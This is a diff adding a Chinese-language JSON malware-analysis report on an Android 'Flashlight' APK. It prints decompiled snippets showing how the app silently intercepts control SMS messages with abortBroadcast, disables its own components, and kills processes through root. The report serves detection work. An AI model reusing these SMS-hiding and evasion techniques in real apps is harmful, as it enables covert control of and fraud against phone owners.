@@ -1,0 +1,127 @@
+{
+  "APK信息": {
+    "文件名": "704a49f2044e963d7c698c3c8ef26fbe43b869df3cdc3a536b9a5b42e211df8b.apk",
+    "sha256": "704a49f2044e963d7c698c3c8ef26fbe43b869df3cdc3a536b9a5b42e211df8b",
+    "包名": "biart.com.flashlight",
+    "应用名": "Flashlight",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 579.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lsysnfg\\managers\\MyTelephonyManager;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\nString[] strArr = SettingsParser.ServiceSettings.PhonesList;\nString controlNumber = strArr[i];\nif (receivedMsg.Address.contains(controlNumber) && receivedMsg.Address.length() - controlNumber.length() <= 2) {\n    if (!getAbortBroadcast()) {\n        abortBroadcast();\n    }\n    msgList.add(receivedMsg);\n}\nfor (int i2 = 0; i2 < msgList.size(); i2++) {\n    processPossibleControlMessage(msgList.get(i2));\n}",
+          "malicious_code_snippet_context": "                  for (Object pdu : pdus) {\n                      SmsMessage tmpMsg = SmsMessage.createFromPdu((byte[]) pdu);\n                      if (tmpMsg != null) {\n>>>                         TSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\n>>>                         String[] strArr = SettingsParser.ServiceSettings.PhonesList;\n>>>                         int length = strArr.length;\n>>>                         int i = 0;\n>>>                         while (true) {\n>>>                             if (i < length) {\n>>>                                 String controlNumber = strArr[i];\n>>>                                 if (!receivedMsg.Address.contains(controlNumber) || receivedMsg.Address.length() - controlNumber.length() > 2) {\n>>>                                     i++;\n>>>                                 } else {\n>>>                                     if (!getAbortBroadcast()) {\n>>>                                         abortBroadcast();\n                                      }\n                                      msgList.add(receivedMsg);\n                                  }",
+          "behavior_description": "代码从接收到的短信中提取消息内容和来源地址，与预设控制号码列表 PhonesList 匹配；若匹配则调用 abortBroadcast() 终止短信广播，使短信不进入收件箱或通知栏，随后将短信加入列表并交给 processPossibleControlMessage 处理，实现短信拦截和隐蔽接收控制指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsysnfg\\ServiceEngine;",
+          "method_signature": "if(CameraHub.canUseCamera()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ComponentName receiver = new ComponentName(App.getContext(), StartBroadcastReceiver.class);\nPackageManager pm = App.getContext().getPackageManager();\npm.setComponentEnabledSetting(receiver, 2, 1);",
+          "malicious_code_snippet_context": "              if (CameraHub.canUseCamera()) {\n                  CameraHub.cleanUp();\n              }\n>>>             ComponentName receiver = new ComponentName(App.getContext(), (Class<?>) StartBroadcastReceiver.class);\n>>>             PackageManager pm = App.getContext().getPackageManager();\n>>>             pm.setComponentEnabledSetting(receiver, 2, 1);\n              removePresenceFlag();\n              App.getContext().stopService(new Intent(BackgroundService.class.getName()));\n          } catch (Exception e) {",
+          "behavior_description": "恶意样本在selfKill方法中通过PackageManager.setComponentEnabledSetting()将StartBroadcastReceiver组件设置为DISABLED状态(参数值为2)，使该广播接收器被禁用。结合上下文中的cleanUpFiles、stopService以及后续uninstallSelf()删除/system/app下APK文件等行为，这是恶意软件在完成潜伏或准备自删除前的隐蔽清理操作，通过禁用关键组件减少自身暴露面，降低被用户和安全工具发现的概率。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootTools\\RootTools;",
+          "method_signature": "killProcess(String processName)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static boolean killProcess(String processName) {\n    return getInternals().killProcess(processName);\n}",
+          "malicious_code_snippet_context": "          return RootShell.isRootAvailable();\n      }\n  \n>>>     public static boolean killProcess(String processName) {\n>>>         return getInternals().killProcess(processName);\n>>>     }\n  \n      public static void offerBusyBox(Activity activity) {\n          getInternals().offerBusyBox(activity);",
+          "behavior_description": "通过 RootTools 库的 killProcess 方法，利用 root 权限根据进程名杀死指定进程。在恶意样本上下文中，该行为通常用于终止安全软件（如杀毒应用）进程以逃避检测，或杀死竞品恶意软件、系统关键进程以实施破坏。数据来源为传入的 processName 参数（可能为硬编码的安全软件包名），sink 为通过 root 权限执行的进程杀死操作。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
